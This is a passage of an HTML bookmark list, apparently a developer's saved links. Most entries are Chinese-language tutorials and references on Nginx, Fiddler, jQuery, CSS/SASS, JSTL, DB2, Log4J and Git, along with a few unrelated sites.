href=\"http://xsllqs.blog.51cto.com/2308669/1825680\" target=\"_blank\" rel=\"noopener\">http://xsllqs.blog.51cto.com/2308669/1825680</a></p>\n<p>nginx 平台初探(100%) — Nginx 开发从入门到精通<br><a href=\"http://tengine.taobao.org/book/chapter_02.html\" target=\"_blank\" rel=\"noopener\">http://tengine.taobao.org/book/chapter_02.html</a></p>\n<p>Nginx 反向代理与负载均衡实践 丨 时光不老，我们记得就好<br><a href=\"http://www.dockerwy.com/dockewy/36\" target=\"_blank\" rel=\"noopener\">http://www.dockerwy.com/dockewy/36</a></p>\n<p>架构设计：负载均衡层设计方案（7）——LVS + Keepalived + Nginx 安装及配置 - JAVA 入门中 - 博客频道 - CSDN.NET<br><a href=\"http://blog.csdn.net/yinwenjie/article/details/47211551\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/yinwenjie/article/details/47211551</a></p>\n<p>Nginx+Keepalived 实现站点高可用 | Sean’s Notes<br><a href=\"http://seanlook.com/2015/05/18/nginx-keepalived-ha/\" target=\"_blank\" rel=\"noopener\">http://seanlook.com/2015/05/18/nginx-keepalived-ha/</a></p>\n<p>Docker 研習營 1119 - Google 簡報<br><a href=\"https://docs.google.com/presentation/d/1pBBTzAbKAYTDXDE6ZDZzQkFKzFisMPQB8T96o1-N7po/pub?start=false&amp;loop=false&amp;delayms=3000#slide=id.g19613dd9d0_0_746\" target=\"_blank\" rel=\"noopener\">https://docs.google.com/presentation/d/1pBBTzAbKAYTDXDE6ZDZzQkFKzFisMPQB8T96o1-N7po/pub?start=false&amp;loop=false&amp;delayms=3000#slide=id.g19613dd9d0_0_746</a></p>\n<p>把 Fiddler 配置成 reverse proxy « 张岭 (Zhang Ling’s Blog)<br><a href=\"http://www.zhangling.org/blog/20140801/config-fiddler-as-reverse-proxy.html\" target=\"_blank\" rel=\"noopener\">http://www.zhangling.org/blog/20140801/config-fiddler-as-reverse-proxy.html</a></p>\n<p><a href=\"https://zkd.me/blog/debug-https-use-fiddler/\" target=\"_blank\" rel=\"noopener\">https://zkd.me/blog/debug-https-use-fiddler/</a><br><a href=\"https://zkd.me/blog/debug-https-use-fiddler/\" target=\"_blank\" rel=\"noopener\">https://zkd.me/blog/debug-https-use-fiddler/</a></p>\n<p>前后端分离的利器：fiddler 的实用功能举例 - p2227 - 博客园<br><a href=\"http://www.cnblogs.com/p2227/p/fiddler-practice.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/p2227/p/fiddler-practice.html</a></p>\n<p>登入 - Google 帳戶<br><a href=\"https://calendar.google.com/accounts/SetOSID?authuser=0&amp;continue=https%3A%2F%2Fcalendar.google.com%2Fcalendar%2Fembed%3Fsrc%3D8lj511li54lc5q2etflo7utof8%2540group.calendar.google.com%26ct\" target=\"_blank\" rel=\"noopener\">https://calendar.google.com/accounts/SetOSID?authuser=0&amp;continue=https%3A%2F%2Fcalendar.google.com%2Fcalendar%2Fembed%3Fsrc%3D8lj511li54lc5q2etflo7utof8%2540group.calendar.google.com%26ct</a><br>z%3DAsia%252FTaipei%26pli%3D1%26auth%3DoASOEdrK2y3CSd-3Yl5sc584o5xFz73oGLMeQeOlnmkWRydMeClV6eqebzXlyfe-PZR93w.&amp;osidt=ALWU2ctBSE4NOkxexbNpllo6Q6Y3tpGWX2ZTXPsKmS6EfkOVzXdBESj4tfDwNflfiTxrIRry23wC7HGMaPnW8Hl29OF1yRIlz1lOQQt6LRRZjQTKWLFGaHil3mFXsB4EJH-xHZjqzkDC<br>5 款移动开发轻量 jQuery 的替代品 | IT 瘾<br><a href=\"http://itindex.net/detail/46441-%E7%A7%BB%E5%8A%A8-%E5%BC%80%E5%8F%91-jquery\" target=\"_blank\" rel=\"noopener\">http://itindex.net/detail/46441-%E7%A7%BB%E5%8A%A8-%E5%BC%80%E5%8F%91-jquery</a></p>\n<p>PrimeUI<br><a href=\"https://www.primefaces.org/primeui/#panelmenu\" target=\"_blank\" rel=\"noopener\">https://www.primefaces.org/primeui/#panelmenu</a></p>\n<p>Asynchronous and deferred JavaScript execution explained « Peter Beverloo<br><a href=\"http://peter.sh/experiments/asynchronous-and-deferred-javascript-execution-explained/\" target=\"_blank\" rel=\"noopener\">http://peter.sh/experiments/asynchronous-and-deferred-javascript-execution-explained/</a></p>\n<p>关于字体图标在 firefox 上本地访问无法显示的问题分析 - 二两豆腐<br><a href=\"https://my.oschina.net/u/2457218/blog/782822\" target=\"_blank\" rel=\"noopener\">https://my.oschina.net/u/2457218/blog/782822</a></p>\n<p>Swagger 初探<br><a href=\"http://www.lilinjian.com/web/2015/12/25/swagger.html\" target=\"_blank\" rel=\"noopener\">http://www.lilinjian.com/web/2015/12/25/swagger.html</a></p>\n<p>postman 中 form-data、x-www-form-urlencoded、raw、binary 的区别 - wangjun5159 的专栏 - 博客频道 - CSDN.NET<br><a href=\"http://blog.csdn.net/wangjun5159/article/details/47781443\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/wangjun5159/article/details/47781443</a></p>\n<p>jquery - How can get length on checked checkbox array javascript - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/15110437/how-can-get-length-on-checked-checkbox-array-javascript\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/15110437/how-can-get-length-on-checked-checkbox-array-javascript</a></p>\n<p>用 lodash 替换掉 Underscore<em>岁月静好_sam</em>新浪博客<br><a href=\"http://blog.sina.com.cn/s/blog_7035c6ac0102w9ym.html\" target=\"_blank\" rel=\"noopener\">http://blog.sina.com.cn/s/blog_7035c6ac0102w9ym.html</a></p>\n<p>javascript - QUnit - test in loop, index always the same - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/36021953/qunit-test-in-loop-index-always-the-same\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/36021953/qunit-test-in-loop-index-always-the-same</a></p>\n<p>Lagacy Project - 重構心得 « fall1600<br><a href=\"http://fall1600.logdown.com/posts/1159901\" target=\"_blank\" rel=\"noopener\">http://fall1600.logdown.com/posts/1159901</a></p>\n<p>INFORMATION_SCHEMA.COLUMNS<br><a href=\"https://www.mssqltips.com/sqlservertutorial/183/informationschemacolumns/\" target=\"_blank\" rel=\"noopener\">https://www.mssqltips.com/sqlservertutorial/183/informationschemacolumns/</a></p>\n<p>SETTIMEOUT 使用閉包功能,實現定時列印數值 - 壹讀<br><a href=\"https://read01.com/Oy5A.html\" target=\"_blank\" rel=\"noopener\">https://read01.com/Oy5A.html</a></p>\n<p>MOTC Helper<br><a href=\"http://ptx.transportdata.tw/MOTC/Swagger/#!/Account/Account_Login\" target=\"_blank\" rel=\"noopener\">http://ptx.transportdata.tw/MOTC/Swagger/#!/Account/Account_Login</a></p>\n<p>网页模板,网站模板,DIV+CSS 模板,企业网站模板下载-模板之家<br><a href=\"http://www.cssmoban.com/\" target=\"_blank\" rel=\"noopener\">http://www.cssmoban.com/</a></p>\n<p>网页中图片旋转的几种实现方式 - rentj - 博客园<br><a href=\"http://www.cnblogs.com/rentj1/archive/2012/10/13/2722124.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/rentj1/archive/2012/10/13/2722124.html</a></p>\n<p>mrkt 的程式學習筆記: jQuery 練習題 : 圖片即時縮圖並裁剪顯示為正方形<br><a href=\"http://kevintsengtw.blogspot.com/2012/05/jquery.html\" target=\"_blank\" rel=\"noopener\">http://kevintsengtw.blogspot.com/2012/05/jquery.html</a></p>\n<p>图片(旋转/缩放/翻转)变换效果(ccs3/滤镜/canvas) - cloudgamer - 博客园<br><a href=\"http://www.cnblogs.com/cloudgamer/archive/2010/08/16/ImageTrans.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/cloudgamer/archive/2010/08/16/ImageTrans.html</a></p>\n<p>CSS3 Filter 的十种特效_filter 教程_w3cplus<br><a href=\"http://www.w3cplus.com/css3/ten-effects-with-css3-filter\" target=\"_blank\" rel=\"noopener\">http://www.w3cplus.com/css3/ten-effects-with-css3-filter</a></p>\n<p>JSTL If With Logical Operator And/Or : If « JSTL « Java Tutorial<br><a href=\"http://www.java2s.com/Tutorial/Java/0380__JSTL/JSTLIfWithLogicalOperatorAndOr.htm\" target=\"_blank\" rel=\"noopener\">http://www.java2s.com/Tutorial/Java/0380__JSTL/JSTLIfWithLogicalOperatorAndOr.htm</a></p>\n<p>css – SUSY2 教學範例 – 基本 | jsnWork<br><a href=\"http://jsnwork.kiiuo.com/archives/1509/css-susy2-%E6%95%99%E5%AD%B8\" target=\"_blank\" rel=\"noopener\">http://jsnwork.kiiuo.com/archives/1509/css-susy2-%E6%95%99%E5%AD%B8</a></p>\n<p><a href=\"http://jas9.blogspot.com/2011/09/pxemrem.html\" target=\"_blank\" rel=\"noopener\">http://jas9.blogspot.com/2011/09/pxemrem.html</a><br><a href=\"http://jas9.blogspot.com/2011/09/pxemrem.html\" target=\"_blank\" rel=\"noopener\">http://jas9.blogspot.com/2011/09/pxemrem.html</a></p>\n<p>徹底理解 UI 及 Web 的尺寸單位：基本觀念 – UXabc – Medium<br><a href=\"https://medium.com/uxabc/understanding-ui-units-8acdc0575388#.nzpwg9rkl\" target=\"_blank\" rel=\"noopener\">https://medium.com/uxabc/understanding-ui-units-8acdc0575388#.nzpwg9rkl</a></p>\n<p>PHP 5.3、5.4、5.5、5.6 中的新特性 - 风逐蓝天’s Blog - SegmentFault<br><a href=\"https://segmentfault.com/a/1190000002790818\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000002790818</a></p>\n<p>DevOps：持續整合＆持續交付（Docker、CircleCI、AWS）<br><a href=\"http://blog.amowu.com/2015/04/devops-continuous-integration-delivery-docker-circleci-aws-beanstalk.html\" target=\"_blank\" rel=\"noopener\">http://blog.amowu.com/2015/04/devops-continuous-integration-delivery-docker-circleci-aws-beanstalk.html</a></p>\n<p>Lee Bor-Jian | 數學教師 | Udemy<br><a href=\"https://www.udemy.com/user/e3inqhwawxzw/\" target=\"_blank\" rel=\"noopener\">https://www.udemy.com/user/e3inqhwawxzw/</a></p>\n<p>Scapy 網路封包分析工具 - John’s Lin Blog<br><a href=\"http://linton.tw/2013/10/18/scapy-network-packet-analysis-tool/\" target=\"_blank\" rel=\"noopener\">http://linton.tw/2013/10/18/scapy-network-packet-analysis-tool/</a></p>\n<p>cmder 中文显示相关问题解决方案(1.3 以上版本) | Wentao<br><a href=\"http://wentaoma.com/2016/08/31/cmder-chinese-encode/\" target=\"_blank\" rel=\"noopener\">http://wentaoma.com/2016/08/31/cmder-chinese-encode/</a></p>\n<p>SASS Cheat Sheet<br><a href=\"https://sass-cheatsheet.brunoscopelliti.com/\" target=\"_blank\" rel=\"noopener\">https://sass-cheatsheet.brunoscopelliti.com/</a></p>\n<p>css2sass | Convert CSS Snippets to Syntactically Awesome StyleSheets code<br><a href=\"http://css2sass.herokuapp.com/\" target=\"_blank\" rel=\"noopener\">http://css2sass.herokuapp.com/</a></p>\n<p>如何當個能讓設計師好好設計的前端工程師 by Denny Ku<br><a href=\"http://slides.com/dennyku/deck-5-6#/6/24\" target=\"_blank\" rel=\"noopener\">http://slides.com/dennyku/deck-5-6#/6/24</a></p>\n<p>白鼠筆記<br><a href=\"http://classroom.sliiice.com/\" target=\"_blank\" rel=\"noopener\">http://classroom.sliiice.com/</a></p>\n<p>沒有符合條件的頁面。 – 我的博客<br><a href=\"http://junnnnj.com/uncategorized/sass-variables-%E9%A1%8F%E8%89%B2%E5%91%BD%E5%90%8D/\" target=\"_blank\" rel=\"noopener\">http://junnnnj.com/uncategorized/sass-variables-%E9%A1%8F%E8%89%B2%E5%91%BD%E5%90%8D/</a></p>\n<p>如何解决 inline-block 元素的空白间距_inline-block 教程_w3cplus<br><a href=\"http://www.w3cplus.com/css/fighting-the-space-between-inline-block-elements\" target=\"_blank\" rel=\"noopener\">http://www.w3cplus.com/css/fighting-the-space-between-inline-block-elements</a></p>\n<p>Parallax with Greensock Tweenlite<br><a href=\"http://codepen.io/planetgrafix/pen/bcEhe\" target=\"_blank\" rel=\"noopener\">http://codepen.io/planetgrafix/pen/bcEhe</a></p>\n<p>Git-rebase 小筆記 - Yu-Cheng Chuang’s Blog<br><a href=\"https://blog.yorkxin.org/2011/07/29/git-rebase\" target=\"_blank\" rel=\"noopener\">https://blog.yorkxin.org/2011/07/29/git-rebase</a></p>\n<p>web tech topic - YouTube<br><a href=\"https://www.youtube.com/results?search_query=web+tech+topic\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/results?search_query=web+tech+topic</a></p>\n<p>[Git] Reset - mixed, hard and soft | 搞搞就懂 - 點部落<br><a href=\"https://dotblogs.com.tw/wasichris/2016/04/29/225157\" target=\"_blank\" rel=\"noopener\">https://dotblogs.com.tw/wasichris/2016/04/29/225157</a></p>\n<p>Error 404 (Not Found)!!1<br><a href=\"http://webcache.googleusercontent.com/search?q=cache:TM56ObJ6f9kJ:www.fcxos.com/index.php/Index/blog/view/12&amp;num=1&amp;hl=zh-TW&amp;gl=tw&amp;strip=1&amp;vwsrc=0\" target=\"_blank\" rel=\"noopener\">http://webcache.googleusercontent.com/search?q=cache:TM56ObJ6f9kJ:www.fcxos.com/index.php/Index/blog/view/12&amp;num=1&amp;hl=zh-TW&amp;gl=tw&amp;strip=1&amp;vwsrc=0</a></p>\n<p>译~GreenSock 动画平台(GSAP)的 JavaScript 版本入门 - 程序园<br><a href=\"http://www.voidcn.com/blog/kaizi524/article/p-4923483.html\" target=\"_blank\" rel=\"noopener\">http://www.voidcn.com/blog/kaizi524/article/p-4923483.html</a></p>\n<p>Wu Jack - YouTube<br><a href=\"https://www.youtube.com/user/JackWuSEO\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/user/JackWuSEO</a></p>\n<p>旅旅 | 500 Error<br><a href=\"http://tw.tavitavi.com/articles/7\" target=\"_blank\" rel=\"noopener\">http://tw.tavitavi.com/articles/7</a></p>\n<p><a href=\"http://ncrblue.pixnet.net/blog/post/41351449-sega-%E6%9D%B1%E4%BA%ACjoypolis-\" target=\"_blank\" rel=\"noopener\">http://ncrblue.pixnet.net/blog/post/41351449-sega-%E6%9D%B1%E4%BA%ACjoypolis-</a><br><a href=\"http://ncrblue.pixnet.net/blog/post/41351449-sega-%E6%9D%B1%E4%BA%ACjoypolis-\" target=\"_blank\" rel=\"noopener\">http://ncrblue.pixnet.net/blog/post/41351449-sega-%E6%9D%B1%E4%BA%ACjoypolis-</a></p>\n<p>領域驅動設計 (Domain Driven Design)<br><a href=\"https://www.slideshare.net/regionbbs/domain-driven-design-63466068\" target=\"_blank\" rel=\"noopener\">https://www.slideshare.net/regionbbs/domain-driven-design-63466068</a></p>\n<p>SweetAlert<br><a href=\"http://t4t5.github.io/sweetalert/\" target=\"_blank\" rel=\"noopener\">http://t4t5.github.io/sweetalert/</a></p>\n<p>天空的垃圾場<br><a href=\"http://skychang.github.io/\" target=\"_blank\" rel=\"noopener\">http://skychang.github.io/</a></p>\n<p>@川原礫 作品集 哈啦板 - 巴哈姆特<br><a href=\"https://forum.gamer.com.tw/C.php?bsn=42388&amp;snA=13731&amp;tnum=2\" target=\"_blank\" rel=\"noopener\">https://forum.gamer.com.tw/C.php?bsn=42388&amp;snA=13731&amp;tnum=2</a></p>\n<p>免費 DDNS 服務 – Linux 技術手札<br><a href=\"https://www.phpini.com/internet/free-ddns\" target=\"_blank\" rel=\"noopener\">https://www.phpini.com/internet/free-ddns</a></p>\n<p>[ASP.NET WebApi]使用 JWT 進行 web api 驗證 | 全端開發人員天梯 - 點部落<br><a href=\"https://dotblogs.com.tw/wellwind/2016/11/24/jwt-auth-web-api\" target=\"_blank\" rel=\"noopener\">https://dotblogs.com.tw/wellwind/2016/11/24/jwt-auth-web-api</a></p>\n<p>Not Found – Medium<br><a href=\"https://blog.25sprout.com/2015/03/fixed_ie8_tech/?gi=837e1cdfcb6a\" target=\"_blank\" rel=\"noopener\">https://blog.25sprout.com/2015/03/fixed_ie8_tech/?gi=837e1cdfcb6a</a></p>\n<p>//Sublime Text Love<br><a href=\"http://sublimetextlove.tumblr.com/\" target=\"_blank\" rel=\"noopener\">http://sublimetextlove.tumblr.com/</a></p>\n<p>DB2 OLAP 函數的使用 @ 資訊園 :: 痞客邦 PIXNET ::<br><a href=\"http://fecbob.pixnet.net/blog/post/38193247-db2-olap%E5%87%BD%E6%95%B8%E7%9A%84%E4%BD%BF%E7%94%A8\" target=\"_blank\" rel=\"noopener\">http://fecbob.pixnet.net/blog/post/38193247-db2-olap%E5%87%BD%E6%95%B8%E7%9A%84%E4%BD%BF%E7%94%A8</a></p>\n<p>DB2 中如何實現 Oracle 的相關功能 - chinayuan 的专栏 - 博客频道 - CSDN.NET<br><a href=\"http://blog.csdn.net/chinayuan/article/details/3469799\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/chinayuan/article/details/3469799</a></p>\n<p>昭佑.天翔: Oracle Select SQL Tuning 查詢效能調整<br><a href=\"http://tomkuo139.blogspot.tw/2009/08/oracle-select-sql-tuning.html\" target=\"_blank\" rel=\"noopener\">http://tomkuo139.blogspot.tw/2009/08/oracle-select-sql-tuning.html</a></p>\n<p>日期格式化{0:yyyy-MM-dd HH:mm:ss.fff}和{0:yyyy-MM-dd hh:mm:ss.fff}的区别 - 唔愛吃蘋果 - 博客园<br><a href=\"http://www.cnblogs.com/jhxk/articles/1618194.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/jhxk/articles/1618194.html</a></p>\n<p>一款简单的 jquery json 对象发送服务器端接收实例-Java 基础-Jsp 教程-壹聚教程网<br><a href=\"http://www.111cn.net/jsp/Java/36017.htm\" target=\"_blank\" rel=\"noopener\">http://www.111cn.net/jsp/Java/36017.htm</a></p>\n<p>[jQuery] 如何為 DatePicker 加上中文化日期選項？ – 藏經閣<br><a href=\"http://blog.e-happy.com.tw/?p=5011\" target=\"_blank\" rel=\"noopener\">http://blog.e-happy.com.tw/?p=5011</a></p>\n<p>小信豬的原始部落: Java 學習筆記 (10) - Reflection<br><a href=\"http://godleon.blogspot.com/2007/09/class-class-java-class-class-jvm-class.html\" target=\"_blank\" rel=\"noopener\">http://godleon.blogspot.com/2007/09/class-class-java-class-class-jvm-class.html</a></p>\n<p>jsPerf: JavaScript performance playground<br><a href=\"https://jsperf.com/\" target=\"_blank\" rel=\"noopener\">https://jsperf.com/</a></p>\n<p>DB2 日期與時間型別操作 @ vic 的隨手筆記 :: 隨意窩 Xuite 日誌<br><a href=\"http://blog.xuite.net/mpsky/myblog/23838369-DB2+%E6%97%A5%E6%9C%9F%E8%88%87%E6%99%82%E9%96%93%E5%9E%8B%E5%88%A5%E6%93%8D%E4%BD%9C\" target=\"_blank\" rel=\"noopener\">http://blog.xuite.net/mpsky/myblog/23838369-DB2+%E6%97%A5%E6%9C%9F%E8%88%87%E6%99%82%E9%96%93%E5%9E%8B%E5%88%A5%E6%93%8D%E4%BD%9C</a></p>\n<p>程式倉庫: JSP &amp; Servlet JSTL 使用簡介<br><a href=\"http://vencilcodestore.blogspot.tw/2010/08/jsp-servlet-jstl.html\" target=\"_blank\" rel=\"noopener\">http://vencilcodestore.blogspot.tw/2010/08/jsp-servlet-jstl.html</a></p>\n<p>java - How to iterate an ArrayList inside a HashMap using JSTL? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/2117557/how-to-iterate-an-arraylist-inside-a-hashmap-using-jstl\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/2117557/how-to-iterate-an-arraylist-inside-a-hashmap-using-jstl</a></p>\n<p>JANGS’S KM<br><a href=\"http://www.wfps.tp.edu.tw/eip/jangs/index2.asp?mid=17&amp;sid=showdata&amp;did=135\" target=\"_blank\" rel=\"noopener\">http://www.wfps.tp.edu.tw/eip/jangs/index2.asp?mid=17&amp;sid=showdata&amp;did=135</a></p>\n<p>JWorld@TW Java 論壇 - request 的 setAttribute 問題<br><a href=\"https://www.javaworld.com.tw/jute/post/view?bid=6&amp;id=86216&amp;tpg=1&amp;ppg=1&amp;sty=1&amp;age=0#86216\" target=\"_blank\" rel=\"noopener\">https://www.javaworld.com.tw/jute/post/view?bid=6&amp;id=86216&amp;tpg=1&amp;ppg=1&amp;sty=1&amp;age=0#86216</a></p>\n<p>database - What are the query browsers for DB2? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/8381345/what-are-the-query-browsers-for-db2\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/8381345/what-are-the-query-browsers-for-db2</a></p>\n<p>从 jQuery 的 ajax 请求中删除 X-Requested-With - ruipheng 的专栏 - 博客频道 - CSDN.NET<br><a href=\"http://blog.csdn.net/ruipheng/article/details/17263517\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/ruipheng/article/details/17263517</a></p>\n<p>dream-hua.net -  这个网站可出售。 -  最佳的 dream-hua 来源和相关信息。<br><a href=\"http://ww1.dream-hua.net/\" target=\"_blank\" rel=\"noopener\">http://ww1.dream-hua.net/</a></p>\n<p>Sublime Text shortcut – convert to lowercase/uppercase | Lysender’s Daily Log Book<br><a href=\"https://blog.lysender.com/2013/05/sublime-text-shortcut-convert-to-lowercaseuppercase/\" target=\"_blank\" rel=\"noopener\">https://blog.lysender.com/2013/05/sublime-text-shortcut-convert-to-lowercaseuppercase/</a></p>\n<p>Log4J 依不同 class 產出不同 log file @ Jemmy Walker :: 痞客邦 PIXNET ::<br><a href=\"http://jemmywalker.pixnet.net/blog/post/38324083-log4j%E4%BE%9D%E4%B8%8D%E5%90%8Cclass%E7%94%A2%E5%87%BA%E4%B8%8D%E5%90%8Clog-file\" target=\"_blank\" rel=\"noopener\">http://jemmywalker.pixnet.net/blog/post/38324083-log4j%E4%BE%9D%E4%B8%8D%E5%90%8Cclass%E7%94%A2%E5%87%BA%E4%B8%8D%E5%90%8Clog-file</a></p>\n<p>[JAVA] Log4J @ 過太爽的日子 :: 隨意窩 Xuite 日誌<br><a href=\"http://blog.xuite.net/chihho32/blog/9121126-%5BJAVA%5D+Log4J\" target=\"_blank\" rel=\"noopener\">http://blog.xuite.net/chihho32/blog/9121126-%5BJAVA%5D+Log4J</a></p>\n<p>Top 10 Tips on Logging in Java - Tutorial<br><a href=\"http://javarevisited.blogspot.tw/2011/05/top-10-tips-on-logging-in-java.html\" target=\"_blank\" rel=\"noopener\">http://javarevisited.blogspot.tw/2011/05/top-10-tips-on-logging-in-java.html</a></p>\n<p>DB2 命令寶典 @ 資訊園 :: 痞客邦 PIXNET ::<br><a href=\"http://fecbob.pixnet.net/blog/post/38199613-db2-%E5%91%BD%E4%BB%A4%E5%AF%B6%E5%85%B8\" target=\"_blank\" rel=\"noopener\">http://fecbob.pixnet.net/blog/post/38199613-db2-%E5%91%BD%E4%BB%A4%E5%AF%B6%E5%85%B8</a></p>\n<p>Sublime Text 2 快捷键 (windows) - Cat 的日志 - 网易博客<br><a href=\"http://istyles.blog.163.com/blog/static/1811003892011828111418654/\" target=\"_blank\" rel=\"noopener\">http://istyles.blog.163.com/blog/static/1811003892011828111418654/</a></p>\n<p>Organization Chart  |  Charts  |  Google Developers<br><a href=\"https://developers.google.com/chart/interactive/docs/gallery/orgchart?csw=1#Example\" target=\"_blank\" rel=\"noopener\">https://developers.google.com/chart/interactive/docs/gallery/orgchart?csw=1#Example</a></p>\n<p>JerryQu 的小站<br><a href=\"https://imququ.com/\" target=\"_blank\" rel=\"noopener\">https://imququ.com/</a></p>\n<p>JWorld@TW Java 論壇 - How can i save JTextPane content in jpg file<br><a href=\"https://www.javaworld.com.tw/jute/post/view?bid=5&amp;id=108955&amp;sty=1&amp;tpg=1&amp;age=0\" target=\"_blank\" rel=\"noopener\">https://www.javaworld.com.tw/jute/post/view?bid=5&amp;id=108955&amp;sty=1&amp;tpg=1&amp;age=0</a></p>\n<p>potatoes and carrots no bones: JAVA: Convert Image to Base64 String and Base64 String to Image<br><a href=\"http://ben-bai.blogspot.com/2012/08/java-convert-image-to-base64-string-and.html\" target=\"_blank\" rel=\"noopener\">http://ben-bai.blogspot.com/2012/08/java-convert-image-to-base64-string-and.html</a></p>\n<p>家系圖 @ 宜寧居家護理所 :: 隨意窩 Xuite 日誌<br><a href=\"http://blog.xuite.net/home.care/homecare/21172623-%E5%AE%B6%E7%B3%BB%E5%9C%96\" target=\"_blank\" rel=\"noopener\">http://blog.xuite.net/home.care/homecare/21172623-%E5%AE%B6%E7%B3%BB%E5%9C%96</a></p>\n<p>Saving a Java 2d graphics image as .png file - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/8202253/saving-a-java-2d-graphics-image-as-png-file\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/8202253/saving-a-java-2d-graphics-image-as-png-file</a></p>\n<p>JT∞l Draw 家系圖工具<br><a href=\"http://tool.imjerry.net/\" target=\"_blank\" rel=\"noopener\">http://tool.imjerry.net/</a></p>\n<p>松露筆管麵: 使用 javascript ShowModalDialog<br><a href=\"http://trufflepenne.blogspot.tw/2013/05/javascript-showmodaldialog.html\" target=\"_blank\" rel=\"noopener\">http://trufflepenne.blogspot.tw/2013/05/javascript-showmodaldialog.html</a></p>\n<p>Windy, Windyty, Windytv. Wind map &amp; weather forecast<br><a href=\"https://www.windy.com/?23.500,121.000,2\" target=\"_blank\" rel=\"noopener\">https://www.windy.com/?23.500,121.000,2</a></p>\n<p>IE7、IE8、IE9 相容性檢視瀏覽網頁與 Quirks 模式的問題 @ 小雕雕的家 :: 痞客邦 PIXNET ::<br><a href=\"http://sweeteason.pixnet.net/blog/\" target=\"_blank\" rel=\"noopener\">http://sweeteason.pixnet.net/blog/</a><br>post/39920453-ie7%E3%80%81ie8%E3%80%81ie9-%E7%9B%B8%E5%AE%B9%E6%80%A7%E6%AA%A2%E8%A6%96%E7%80%8F%E8%A6%BD%E7%B6%B2%E9%A0%81%E8%88%87-quirks-%E6%A8%A1%E5%BC%8F<br>Penguin 工作室，一起 JAVA 吧！ :: 隨意窩 Xuite 日誌<br><a href=\"http://blog.xuite.net/jane17512001/PenguinDesign\" target=\"_blank\" rel=\"noopener\">http://blog.xuite.net/jane17512001/PenguinDesign</a></p>\n<p><a href=\"http://www.tamabc.com\" target=\"_blank\" rel=\"noopener\">www.tamabc.com</a> | 520: 源站返回未知错误<br><a href=\"http://www.tamabc.com/article/84939.html\" target=\"_blank\" rel=\"noopener\">http://www.tamabc.com/article/84939.html</a></p>\n<p>Java 的字串<br><a href=\"https://openhome.cc/Gossip/Encoding/String.html\" target=\"_blank\" rel=\"noopener\">https://openhome.cc/Gossip/Encoding/String.html</a></p>\n<p>Object comparison in JavaScript - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/1068834/object-comparison-in-javascript\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/1068834/object-comparison-in-javascript</a></p>\n<p>Drawing lines with a mouse - JSFiddle<br><a href=\"http://jsfiddle.net/URWru/\" target=\"_blank\" rel=\"noopener\">http://jsfiddle.net/URWru/</a></p>\n<p>URL Regular expression @ Vexed’s Blog :: 隨意窩 Xuite 日誌<br><a href=\"http://blog.xuite.net/vexed/tech/46146920-URL+Regular+expression\" target=\"_blank\" rel=\"noopener\">http://blog.xuite.net/vexed/tech/46146920-URL+Regular+expression</a></p>\n<p>網頁標籤 <frame> 與 <iframe> 簡單說 @ 女生愛科技 :: 痞客邦 PIXNET ::<br><a href=\"http://girllovesdtech.pixnet.net/blog/post/51415186-%E7%B6%B2%E9%A0%81%E6%A8%99%E7%B1%A4-%3Cframe%3E-%E8%88%87-%3Ciframe%3E-%E7%B0%A1%E5%96%AE%E8%AA%AA\" target=\"_blank\" rel=\"noopener\">http://girllovesdtech.pixnet.net/blog/post/51415186-%E7%B6%B2%E9%A0%81%E6%A8%99%E7%B1%A4-%3Cframe%3E-%E8%88%87-%3Ciframe%3E-%E7%B0%A1%E5%96%AE%E8%AA%AA</a></iframe></p>\n<p>404 Not Found<br><a href=\"http://chance-ms.com/%E6%9C%80%E8%BF%91%E5%AF%AB%E7%9A%84%E7%B6%B2%E7%AB%99%E9%81%87%E5%88%B0%E4%B8%80%E5%80%8B%E5%95%8F%E9%A1%8C-ie%E8%A3%A1%E7%9A%84iframe-%E4%B8%8D%E6%94%AF%E6%8F%B4jqu\" target=\"_blank\" rel=\"noopener\">http://chance-ms.com/%E6%9C%80%E8%BF%91%E5%AF%AB%E7%9A%84%E7%B6%B2%E7%AB%99%E9%81%87%E5%88%B0%E4%B8%80%E5%80%8B%E5%95%8F%E9%A1%8C-ie%E8%A3%A1%E7%9A%84iframe-%E4%B8%8D%E6%94%AF%E6%8F%B4jqu</a><br>ery1-10-1/<br>不換頁技術的介紹<br><a href=\"http://webcache.googleusercontent.com/search?q=cache:J7du_K0HeRAJ:josephj.com/prototype/JosephJiang/Presentation/NoPostBack/demo.html+&amp;cd=13&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw\" target=\"_blank\" rel=\"noopener\">http://webcache.googleusercontent.com/search?q=cache:J7du_K0HeRAJ:josephj.com/prototype/JosephJiang/Presentation/NoPostBack/demo.html+&amp;cd=13&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw</a></p>\n<p>[請益] 有無比較程式碼差異性的軟體 - 看板 EZsoft - 批踢踢實業坊<br><a href=\"https://www.ptt.cc/bbs/EZsoft/M.1206767410.A.CAD.html\" target=\"_blank\" rel=\"noopener\">https://www.ptt.cc/bbs/EZsoft/M.1206767410.A.CAD.html</a></p>\n<p><a href=\"http://www.finereport.com/tw/knowledge/acquire/jasperreportsireport.html\" target=\"_blank\" rel=\"noopener\">http://www.finereport.com/tw/knowledge/acquire/jasperreportsireport.html</a><br><a href=\"http://www.finereport.com/tw/knowledge/acquire/jasperreportsireport.html\" target=\"_blank\" 